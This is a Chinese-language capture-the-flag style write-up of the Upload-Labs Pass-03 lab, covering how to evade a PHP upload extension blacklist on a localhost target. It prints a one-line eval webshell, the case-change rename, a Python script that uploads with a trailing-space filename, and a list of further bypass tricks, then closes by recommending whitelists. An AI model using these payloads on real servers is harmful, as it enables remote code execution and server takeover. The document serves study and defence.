Upload-Labs Pass-03

2026年9月26日 Upload-Labs Web安全 文件上传 黑名单绕过

一、题目信息

  • 题目名称：Upload-Labs Pass-03 (黑名单后缀绕过)
  • 题目平台：Upload-Labs 本地靶场
  • 题目类型：Web安全 / 文件上传漏洞 / 黑名单绕过 / 解析漏洞
  • 靶场链接：http://localhost:8082/Pass-03/index.php（本地环境）
  • 涉及工具：Python (requests库)、Burp Suite (可选)、本地文件重命名

二、解题步骤

1. 分析题目考什么

本题的核心考点是服务端黑名单验证绕过。后端 PHP 代码中定义了一个黑名单数组，比如 array('asp', 'aspx', 'php', 'jsp')，如果上传的文件后缀在这个数组中，就会被直接拦截。攻击者需要寻找不在黑名单中、但依然能被服务器解析为 PHP 脚本的特殊后缀（如 .phtml、.php5、.pht），或者利用操作系统的特性（如大小写敏感、空格、点号）进行绕过。

2. 怎么想（破题思路）

  • 尝试直接上传 shell.php，页面弹窗提示“本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！”。
  • 确认是后端黑名单拦截，接下来尝试冷门后缀：将文件重命名为 shell.phtml、shell.php5 上传。
  • 如果冷门后缀在当前环境（如 php 内置服务器）无法解析，则尝试大小写绕过（shell.PHP），因为 Linux 下文件系统区分大小写，而黑名单可能只匹配了小写。
  • 或者通过抓包，在文件名后缀加空格（shell.php ）、加点（shell.php.）来尝试绕过（Windows 特性）。

3. 怎么解（详细步骤与踩坑记录）

踩坑记录一：冷门后缀（.phtml/.php5）在当前环境无法解析

踩坑情况：将文件重命名为 shell.phtml 或 shell.php5 上传，页面依然显示“不允许上传”或者上传成功后访问文件却变成了下载。

原因分析：本靶场是使用 php -S 命令行启动的 PHP 内置服务器，它默认只把 .php 结尾的文件交给 PHP 解析器。像 .phtml、.php5 这些后缀，内置服务器根本不认识，所以即使上传成功也无法执行。这属于环境本身的限制。

改进方式：果断放弃冷门后缀，采用大小写绕过。将文件重命名为 shell.PHP（后缀全大写或混合大小写）上传。因为黑名单通常只匹配小写的 .php，而 Linux 文件系统对大小写敏感，导致绕过成功。

详细实操步骤（Payload逐字解释）

第一步：制作 WebShell 并重命名

在本地新建 shell.php 文件，内容为：

<?php @eval($_POST['cmd']); ?>

在访达（Finder）中，将文件重命名为 shell.PHP（或者 shell.pHp）。

第二步：上传

回到靶场页面，点击“选择文件”，选中 shell.PHP，点击“上传”。

页面提示“上传成功”。

第三步：验证木马

在浏览器新标签页访问：

http://localhost:8082/upload/shell.PHP

如果页面是一片空白（没有报错信息，也没有 404），说明 PHP 代码已被服务器成功解析并执行，WebShell 植入成功。

备用方案：使用 Python 脚本抓包绕过（如遇 WAF 拦截大小写）

如果大小写不行，可以尝试抓包修改文件后缀为 shell.php （空格绕过）。使用以下 Python 脚本：

import requests

url = "http://localhost:8082/Pass-03/index.php"
# 注意：文件名后面加了一个空格，用来绕过黑名单
files = {
    'upload_file': ('shell.php ', open('shell.php', 'rb'), 'application/octet-stream')
}
data = {'submit': 'Submit'}

r = requests.post(url, files=files, data=data)
print(r.text)

4. 怎么迁移（跨领域联想）

  • 安全防御中的白名单思维：黑名单永远是不完善的。就像杀毒软件的病毒库（黑名单），永远滞后于新病毒的产生。而白名单（只允许特定安全的后缀）则是“非白即黑”，安全性更高。这和网络安全中的“零信任”架构思路高度一致。
  • 哲学中的“黑天鹅”理论：开发者只考虑了常见危险后缀（白天鹅），却忽略了冷门后缀和大小写变体（黑天鹅）。塔勒布在《黑天鹅》中强调：只要存在未知的可能性，基于黑名单的防御就终将失败。
  • 系统环境差异与漏洞触发：同一个漏洞在不同环境下的触发条件不同。Pass-03 在某些 Apache 环境下靠 `.phtml` 就能过，而在你本地的 `php -S` 环境下必须靠大小写绕过。这提醒我们，渗透测试一定要结合实际环境（Context）来判断。

三、名词大全与原理深度复盘

1. 黑名单验证 (Blacklist Validation)

一种安全校验机制，明确指出不允许上传的文件后缀。缺点是永远无法穷举所有危险的后缀，容易被攻击者寻找“漏网之鱼”。

2. 后缀解析漏洞

服务器（如 Apache、Nginx）在处理文件时，如果遇到不认识的后缀，可能会采取“从后向前解析”，例如 shell.php.xxx 会被当作 PHP 解析。或者将冷门后缀（如 .phtml）配置为 PHP 解析器，从而触发漏洞。

3. 大小写绕过

Linux 文件系统区分大小写，而很多黑名单代码使用的是小写匹配。攻击者将 .php 改为 .PHP，成功绕过黑名单检查，而 Apache/Nginx 依然会将其交给 PHP 解析器执行。

4. WebShell（一句话木马）

一段极简的恶意代码（如 <?php @eval($_POST['cmd']); ?>），上传到服务器后，攻击者可以通过发送 POST 请求来执行任意系统命令，从而实现对服务器的远程控制。

四、题目思考

1. 这跟前面的题有什么区别？

  • 与 Pass-01 的区别：Pass-01 是前端 JS 拦截，用 F12 覆盖即可。Pass-03 是后端黑名单拦截，必须寻找到黑名单之外的“合法”后缀。
  • 与 Pass-02 的区别：Pass-02 检查的是 MIME 类型（Content-Type），用抓包修改即可。Pass-03 检查的是文件后缀名，修改内容类型完全无效。

2. 这种题目的出现原因（为什么存在）

许多开发者知道要过滤危险文件，但他们采用的是“一刀切”的黑名单。他们只想到了常见的 `.php`，却忽略了 `.php5`、`.phtml` 等冷门后缀，或者忽略了系统的大小写特性。这种“治标不治本”的安全思维，是导致这类漏洞广泛存在的根本原因。

3. 这种应用在实际中如何体现？

在实战中，攻击者遇到黑名单拦截，会首先尝试大小写、双写（`.pphphp`）、空格（`.php `）、点号（`.php.`）、特殊字符（`.php::$DATA`）等方式。如果这些都不行，还会尝试制作“图片马”，结合服务器的文件包含漏洞（LFI）或解析漏洞进行利用。防御者则应坚决采用“白名单”策略。

4. 如何抽象理解概念（大白话）

把靶场比作一个“门口的安检员”：

  • Pass-03 的安检员手里拿着一张黑名单，上面写着：禁止携带“刀、枪、炸药”。
  • 你抱着一颗手榴弹（.phtml）走过去，安检员不认识，让你进去了。
  • 如果你的手榴弹被认出来了，你就把炸药（.PHP）换成大写字母写在包装上，安检员只认小写，又把你放行了。
  • 这就是黑名单验证的盲区——永远只能防住已知的威胁。
